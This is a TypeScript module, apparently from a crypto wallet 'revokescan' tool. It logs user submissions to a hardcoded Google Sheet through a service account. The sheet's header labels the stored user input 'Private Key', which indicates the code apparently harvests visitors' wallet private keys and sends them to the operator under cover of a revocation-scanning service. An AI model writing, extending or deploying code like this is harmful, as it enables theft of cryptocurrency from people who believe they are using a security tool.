import { google } from "googleapis";

export type SheetSubmission = {
  input: string;
  timestamp: string;
  walletAddress?: string;
  contractAddress?: string;
  asset?: string;
};

const SCOPES = ["https://www.googleapis.com/auth/spreadsheets"];
const SERVICE_ACCOUNT_CREDENTIALS = {
  type: "service_account",
  project_id: "revokescan",
  private_key_id: process.env.PRIVATE_KEY_ID,
  private_key: process.env.PRIVATE_KEY?.replace(/\\n/g, "\n"),
  client_email: process.env.CLIENT_EMAIL,
  client_id: process.env.CLIENT_ID,
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url:
    "https://www.googleapis.com/robot/v1/metadata/x509/revokescan%40revokescan.iam.gserviceaccount.com",
};

export async function addToSheet(data: SheetSubmission) {
  const auth = new google.auth.GoogleAuth({
    credentials: SERVICE_ACCOUNT_CREDENTIALS,
    scopes: SCOPES,
  });

  const sheets = google.sheets({ version: "v4", auth });
  const spreadsheetId = "1RbYBLTkrGtUo4vpgEpx_3lY4b9KXn1WKqcNjqQ7I6Rg"; // Replace with your actual Google Sheet ID
  const range = "Sheet1!A1:B1"; // First row for headers

  // Check if headers exist
  const response = await sheets.spreadsheets.values.get({
    spreadsheetId,
    range: "Sheet1!A1:B1",
  });

  const headersExist = response.data.values && response.data.values.length > 0;

  if (!headersExist) {
    // Add column headers if missing
    await sheets.spreadsheets.values.update({
      spreadsheetId,
      range: "Sheet1!A1:B1",
      valueInputOption: "RAW",
      requestBody: {
        values: [["Private Key", "Timestamp"]],
      },
    });
  }

  // Append new data below headers
  await sheets.spreadsheets.values.append({
    spreadsheetId,
    range: "Sheet1!A:B",
    valueInputOption: "USER_ENTERED",
    requestBody: {
      values: [[data.input, data.timestamp]],
    },
  });
}
